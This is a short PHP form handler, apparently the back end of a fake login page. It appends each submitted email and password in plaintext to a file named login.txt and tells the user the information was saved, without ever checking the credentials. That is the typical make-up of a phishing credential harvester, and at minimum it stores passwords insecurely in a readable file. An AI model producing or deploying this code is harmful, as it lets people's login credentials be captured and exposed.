<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $data = "Email: " . $email . "\nPassword: " . $password . "\n--------\n";

    // Save to login.txt
    file_put_contents("login.txt", $data, FILE_APPEND);
    
    echo "<h2>Login Submitted</h2>";
    echo "<p>Thank you! Information saved.</p>";
}
?>